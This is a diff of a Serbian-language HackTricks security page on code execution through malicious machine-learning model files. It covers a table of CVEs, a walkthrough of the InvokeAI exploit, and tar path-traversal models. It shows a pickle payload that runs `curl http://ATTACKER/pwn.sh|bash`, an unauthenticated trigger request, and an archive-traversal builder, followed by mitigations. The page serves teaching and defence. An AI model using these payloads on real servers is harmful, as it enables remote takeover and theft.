@@ -2,28 +2,28 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Učitavanje modela u RCE
+## Učitavanje modela za RCE
 
-Modeli mašinskog učenja obično se dele u različitim formatima, kao što su ONNX, TensorFlow, PyTorch, itd. Ovi modeli se mogu učitati na mašine programera ili proizvodne sisteme za korišćenje. Obično modeli ne bi trebali sadržati zlonamerni kod, ali postoje slučajevi kada se model može koristiti za izvršavanje proizvoljnog koda na sistemu kao nameravana funkcija ili zbog ranjivosti u biblioteci za učitavanje modela.
+Modeli mašinskog učenja obično se dele u različitim formatima, kao što su ONNX, TensorFlow, PyTorch, itd. Ovi modeli mogu biti učitani na mašine programera ili proizvodne sisteme za korišćenje. Obično modeli ne bi trebali sadržati zlonamerni kod, ali postoje slučajevi kada se model može koristiti za izvršavanje proizvoljnog koda na sistemu kao nameravana funkcija ili zbog ranjivosti u biblioteci za učitavanje modela.
 
-U vreme pisanja ovo su neki primeri ovog tipa ranjivosti:
+U vreme pisanja, ovo su neki primeri ovog tipa ranjivosti:
 
 | **Okvir / Alat**            | **Ranjivost (CVE ako je dostupno)**                                                                                          | **RCE Vektor**                                                                                                                         | **Reference**                               |
 |-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
-| **PyTorch** (Python)        | *Neosigurana deseralizacija u* `torch.load` **(CVE-2025-32434)**                                                            | Zlonameran pickle u model checkpoint-u dovodi do izvršavanja koda (zaobilazeći `weights_only` zaštitu)                                   | |
-| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + zlonamerno preuzimanje modela uzrokuje izvršavanje koda; Java deseralizacija RCE u API-ju za upravljanje                        | |
-| **TensorFlow/Keras**        | **CVE-2021-37678** (nesiguran YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                    | Učitavanje modela iz YAML koristi `yaml.unsafe_load` (izvršavanje koda) <br> Učitavanje modela sa **Lambda** slojem izvršava proizvoljan Python kod | |
+| **PyTorch** (Python)        | *Nepouzdana deserializacija u* `torch.load` **(CVE-2025-32434)**                                                            | Zlonameran pickle u model checkpoint-u dovodi do izvršavanja koda (zaobilazeći `weights_only` zaštitu)                                   | |
+| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + zlonamerno preuzimanje modela uzrokuje izvršavanje koda; Java deserializacija RCE u upravljačkom API-ju                          | |
+| **TensorFlow/Keras**        | **CVE-2021-37678** (nebezbedan YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                  | Učitavanje modela iz YAML koristi `yaml.unsafe_load` (izvršavanje koda) <br> Učitavanje modela sa **Lambda** slojem pokreće proizvoljan Python kod | |
 | TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsiranje)                                                                                        | Prilagođeni `.tflite` model izaziva prelivanje celobrojne vrednosti → oštećenje heap-a (potencijalni RCE)                               | |
 | **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Učitavanje modela putem `joblib.load` izvršava pickle sa napadačevim `__reduce__` payload-om                                          | |
-| **NumPy** (Python)          | **CVE-2019-6446** (nesiguran `np.load`) *sporan*                                                                             | `numpy.load` podrazumevano dozvoljava pickled objekte nizova – zlonameran `.npy/.npz` izaziva izvršavanje koda                          | |
-| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Spoljna putanja težina ONNX modela može pobjeći iz direktorijuma (čitati proizvoljne datoteke) <br> Zlonamerni ONNX model tar može prepisati proizvoljne datoteke (dovodeći do RCE) | |
+| **NumPy** (Python)          | **CVE-2019-6446** (nebezbedan `np.load`) *sporno*                                                                            | `numpy.load` podrazumevano dozvoljava pickled objekte nizova – zlonameran `.npy/.npz` pokreće izvršavanje koda                          | |
+| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                  | Spoljni put težina ONNX modela može pobjeći iz direktorijuma (čitati proizvoljne datoteke) <br> Zlonameran ONNX model tar može prepisati proizvoljne datoteke (što dovodi do RCE) | |
 | ONNX Runtime (dizajnerski rizik) | *(Nema CVE)* ONNX prilagođene operacije / kontrolni tok                                                                  | Model sa prilagođenim operatorom zahteva učitavanje napadačeve nativne koda; složeni grafovi modela zloupotrebljavaju logiku za izvršavanje nepredviđenih proračuna | |
 | **NVIDIA Triton Server**    | **CVE-2023-31036** (putanja prelaz)                                                                                          | Korišćenje API-ja za učitavanje modela sa `--model-control` omogućeno omogućava relativno prelaz putanje za pisanje datoteka (npr., prepisivanje `.bashrc` za RCE) | |
-| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (više heap prelivanja)                                                                           | Neispravan GGUF model datoteke uzrokuje prelivanje bafera u parseru, omogućavajući proizvoljno izvršavanje koda na sistemu žrtve        | |
-| **Keras (stariji formati)** | *(Nema novog CVE)* Nasleđeni Keras H5 model                                                                                  | Zlonameran HDF5 (`.h5`) model sa kodom Lambda sloja i dalje izvršava prilikom učitavanja (Keras safe_mode ne pokriva stari format – “napad snižavanja”) | |
-| **Drugi** (opšti)           | *Dizajnerska greška* – Pickle serijalizacija                                                                                 | Mnogi ML alati (npr., pickle-bazirani formati modela, Python `pickle.load`) će izvršiti proizvoljni kod ugrađen u datoteke modela osim ako se ne ublaži | |
+| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (više heap prelivanja)                                                                           | Neispravan GGUF model datoteke uzrokuje prelivanje bafera u parseru, omogućavajući proizvoljno izvršavanje koda na sistemu žrtve         | |
+| **Keras (stariji formati)** | *(Nema novog CVE)* Nasleđeni Keras H5 model                                                                                  | Zlonameran HDF5 (`.h5`) model sa kodom Lambda sloja i dalje se izvršava prilikom učitavanja (Keras safe_mode ne pokriva stari format – “napad s degradacijom”) | |
+| **Drugi** (opšti)           | *Dizajnerska greška* – Pickle serijalizacija                                                                                 | Mnogi ML alati (npr., formati modela zasnovani na pickle-u, Python `pickle.load`) će izvršiti proizvoljni kod ugrađen u datoteke modela osim ako se ne ublaži | |
 
-Pored toga, postoje neki modeli zasnovani na Python pickle-u, poput onih koje koristi [PyTorch](https://github.com/pytorch/pytorch/security), koji se mogu koristiti za izvršavanje proizvoljnog koda na sistemu ako se ne učitaju sa `weights_only=True`. Dakle, svaki model zasnovan na pickle-u može biti posebno podložan ovim vrstama napada, čak i ako nisu navedeni u tabeli iznad.
+Pored toga, postoje modeli zasnovani na Python pickle-u kao što su oni koje koristi [PyTorch](https://github.com/pytorch/pytorch/security) koji se mogu koristiti za izvršavanje proizvoljnog koda na sistemu ako se ne učitaju sa `weights_only=True`. Dakle, svaki model zasnovan na pickle-u može biti posebno podložan ovim vrstama napada, čak i ako nisu navedeni u tabeli iznad.
 
 ### 🆕  InvokeAI RCE putem `torch.load` (CVE-2024-12029)
 
@@ -33,11 +33,11 @@ Interno, endpoint na kraju poziva:
 ```python
 checkpoint = torch.load(path, map_location=torch.device("meta"))
 ```
-Kada je dostavljeni fajl **PyTorch checkpoint (`*.ckpt`)**, `torch.load` vrši **pickle deserializaciju**. Pošto sadržaj dolazi direktno sa URL-a koji kontroliše korisnik, napadač može ugraditi zlonamerni objekat sa prilagođenom `__reduce__` metodom unutar checkpoint-a; metoda se izvršava **tokom deserializacije**, što dovodi do **remote code execution (RCE)** na InvokeAI serveru.
+Kada je dostavljeni fajl **PyTorch checkpoint (`*.ckpt`)**, `torch.load` vrši **pickle deserializaciju**. Pošto sadržaj dolazi direktno sa URL-a koji kontroliše korisnik, napadač može ugraditi zlonamerni objekat sa prilagođenom `__reduce__` metodom unutar checkpoint-a; metoda se izvršava **tokom deserializacije**, što dovodi do **daljinskog izvršavanja koda (RCE)** na InvokeAI serveru.
 
 Ranljivost je dodeljena **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).
 
-#### Exploitation walk-through
+#### Vodič za eksploataciju
 
 1. Kreirajte zlonamerni checkpoint:
 ```python
@@ -51,7 +51,7 @@ return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))
 with open("payload.ckpt", "wb") as f:
 pickle.dump(Payload(), f)
 ```
-2. Host `payload.ckpt` na HTTP serveru koji kontrolišete (npr. `http://ATTACKER/payload.ckpt`).
+2. Hostujte `payload.ckpt` na HTTP serveru koji kontrolišete (npr. `http://ATTACKER/payload.ckpt`).
 3. Aktivirajte ranjivu tačku (nije potrebna autentifikacija):
 ```python
 import requests
@@ -67,9 +67,9 @@ json={},                                         # body can be empty
 timeout=5,
 )
 ```
-4. Kada InvokeAI preuzme datoteku, poziva `torch.load()` → `os.system` gadget se pokreće i napadač dobija izvršenje koda u kontekstu InvokeAI procesa.
+4. Kada InvokeAI preuzme datoteku, poziva `torch.load()` → gadget `os.system` se pokreće i napadač dobija izvršenje koda u kontekstu InvokeAI procesa.
 
-Ready-made exploit: **Metasploit** modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo tok.
+Gotov exploit: **Metasploit** modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo tok.
 
 #### Uslovi
 
@@ -79,9 +79,9 @@ Ready-made exploit: **Metasploit** modul `exploit/linux/http/invokeai_rce_cve_20
 
 #### Mogućnosti ublažavanja
 
-* Ažurirajte na **InvokeAI ≥ 5.4.3** – zakrpa postavlja `scan=True` podrazumevano i vrši skeniranje zlonamernog softvera pre deserializacije.
-* Kada programatski učitavate tačke, koristite `torch.load(file, weights_only=True)` ili novi [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) pomoćni alat.
-* Sprovodite liste dozvoljenih / potpisa za izvore modela i pokrećite uslugu sa minimalnim privilegijama.
+* Ažurirajte na **InvokeAI ≥ 5.4.3** – zakrpa postavlja `scan=True` kao podrazumevano i vrši skeniranje zlonamernog softvera pre deserializacije.
+* Kada učitavate tačke kontrole programatski, koristite `torch.load(file, weights_only=True)` ili novi [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) pomoćni alat.
+* Sprovodite liste dozvoljenih / potpisa za izvore modela i pokrenite uslugu sa minimalnim privilegijama.
 
 > ⚠️ Zapamtite da je **bilo koji** Python pickle-bazirani format (uključujući mnoge `.pt`, `.pkl`, `.ckpt`, `.pth` datoteke) inherentno nesiguran za deserializaciju iz nepouzdanih izvora.
 
@@ -131,11 +131,11 @@ model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))
 
 # /tmp/pwned.txt is created even if you get an error
 ```
-## Models to Path Traversal
+## Модели за пролазак кроз пут
 
-Kao što je komentarisano u [**ovom blog postu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), većina formata modela koje koriste različiti AI okviri zasniva se na arhivama, obično `.zip`. Stoga, može biti moguće zloupotrebiti ove formate za izvođenje napada na pretragu putanja, omogućavajući čitanje proizvoljnih datoteka sa sistema na kojem je model učitan.
+Како је коментарисано у [**овој блог објави**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), већина формата модела које користе различити AI оквири заснована је на архивама, обично `.zip`. Стога, може бити могуће злоупотребити ове формате за извођење напада проласка кроз пут, што омогућава читање произвољних датотека из система у коме је модел учитан.
 
-Na primer, sa sledećim kodom možete kreirati model koji će kreirati datoteku u `/tmp` direktorijumu kada se učita:
+На пример, са следећим кодом можете креирати модел који ће креирати датотеку у директоријуму `/tmp` када се учита:
 ```python
 import tarfile
 
@@ -163,9 +163,9 @@ tf.add(PAYLOAD)                      # rides the symlink
 ```
 ## Reference
 
-- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
-- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
-- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
-- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
+- [OffSec blog – "CVE-2024-12029 – InvokeAI deserializacija nepouzdanih podataka"](https://www.offsec.com/blog/cve-2024-12029/)
+- [InvokeAI zakrpa commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
+- [Rapid7 Metasploit modul dokumentacija](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
+- [PyTorch – bezbednosna razmatranja za torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
 
 {{#include ../banners/hacktricks-training.md}}
